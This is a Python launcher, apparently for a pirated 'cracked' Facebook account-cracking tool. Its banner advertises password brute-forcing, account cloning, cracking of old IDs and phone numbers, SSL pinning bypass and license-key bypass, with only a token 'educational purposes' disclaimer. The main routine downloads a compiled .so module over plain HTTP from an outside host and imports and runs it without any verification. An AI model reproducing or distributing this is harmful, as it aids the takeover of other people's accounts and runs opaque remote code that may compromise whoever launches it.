import os
import sys
import time
import requests
try:
    from colorama import Fore, Back, Style, init
except ImportError:
    os.system("pip install colorama requests")
    from colorama import Fore, Back, Style, init

init(autoreset=True, strip=False)

# Link tải cũ như bạn muốn
FILE_URL = "http://phamtienmedia.com/xcmain.cpython-312.so"
FILE_NAME = "xcmain.so"

def download_file():
    try:
        print(f"{Fore.YELLOW}[*] Downloading xcmain.so from server...")
        response = requests.get(FILE_URL, timeout=20)
        if response.status_code == 200:
            with open(FILE_NAME, "wb") as f:
                f.write(response.content)
            print(f"{Fore.GREEN}[✓] Download successful! ({len(response.content)//1024} KB)")
            return True
        else:
            print(f"{Fore.RED}[!] Download failed: Status {response.status_code}")
            return False
    except Exception as e:
        print(f"{Fore.RED}[!] Connection error: {str(e)}")
        return False

def banner():
    os.system('clear')
    C = Fore.CYAN + Style.BRIGHT
    Y = Fore.YELLOW + Style.BRIGHT
    R = Fore.RED + Style.BRIGHT
    G = Fore.GREEN + Style.BRIGHT
    W = Fore.WHITE + Style.BRIGHT
    M = Fore.MAGENTA + Style.BRIGHT

    # Banner XYTEE
    print(f"""
{Y}    ██╗  ██╗██╗   ██╗████████╗███████╗███████╗
{Y}    ╚██╗██╔╝╚██╗ ██╔╝╚══██╔══╝██╔════╝██╔════╝
{Y}     ╚███╔╝  ╚████╔╝    ██║   █████╗  ███████╗
{Y}     ██╔██╗   ╚██╔╝     ██║   ██╔══╝  ╚════██║
{Y}    ██╔╝ ██╗   ██║      ██║   ███████╗███████║
{Y}    ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚══════╝╚══════╝
    """)

    print(f" {M} [ ANDROID BYPASS SYSTEM - CRACK TOOL ]")
    print(f"{W} ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

    # Thông tin tool
    info = [
        ("TOOL NAME ", "XYTEE XC FB TOOL", C),
        ("VERSION   ", "122.0.49 [A12+]", C),
        ("PROJECT   ", "XYTEEE-XC", Y),
        ("AUTHOR    ", "XYTEE", Y),
        ("CRACKER   ", "PHAM TIEN MEDIA", R),
        ("STATUS    ", "BYPASSED & RUNNING", G)
    ]

    for label, value, color in info:
        print(f" {R}[{W}●{R}] {W}{label.ljust(12)}: {color}{value}")
        time.sleep(0.04)

    print(f"{W} ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

    # GIỚI THIỆU TOOL (tiếng Anh)
    print(f"\n{G}[+] INTRODUCTION:")
    print(f"   {W}XYTEE XC is a premium Facebook cracking tool from")
    print(f"   {W}the project XYTEEE-XC. This is a cracked/patched version")
    print(f"   {W}with improved bypass features.")

    # Chức năng của bản crack
    print(f"\n{G}[+] FEATURES OF THIS CRACKED TOOL:")
    crack_features = [
        "• Patch Key & License Bypass",
        "• SSL Pinning Bypass (No Login Issue)",
        "• Unlimited Usage (No Key Required)",
        "• Enhanced Stability & Speed",
        "• Auto Update Disabled (Cracked Version)",
        "• Full Access to All Modules"
    ]

    for func in crack_features:
        print(f"   {G}{func}")
        time.sleep(0.03)

    # Chức năng tool gốc
    print(f"\n{G}[+] ORIGINAL TOOL FEATURES:")
    original_features = [
        "• Brute Force Facebook (Password List)",
        "• File Cloning (M1 > M2 > M3)",
        "• Random Cloning & Public Cloning",
        "• Dump File Creator",
        "• Auto Facebook Account Create",
        "• Crack Old IDs, UID, Phone, Gmail, Username",
        "• Secure SSL Pinning Bypass",
        "• Support Termux, Windows, Linux"
    ]

    for func in original_features:
        print(f"   {G}{func}")
        time.sleep(0.03)

    print(f"\n{R}[!] WARNING:")
    print(f"   {W}• This tool is for educational purposes only")
    print(f"   {W}• Using it to crack accounts is illegal")
    print(f"   {W}• Use at your own risk")

    print(f"\n{W} ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print(f"\n {W}>>> {Y}Press {R}ENTER {Y}to start the tool {W}<<<")
    input()

if __name__ == "__main__":
    banner()
    if download_file():
        try:
            sys.path.append(os.getcwd())
            import xcmain
            print(f"{Fore.GREEN}[✓] Import xcmain.so successful!")
            xcmain.email_verification_system()
        except Exception as e:
            print(f"\n{Fore.RED}[!] Error: {str(e)}")
    else:
        print(f"{Fore.RED}[!] Cannot download xcmain.so from server.")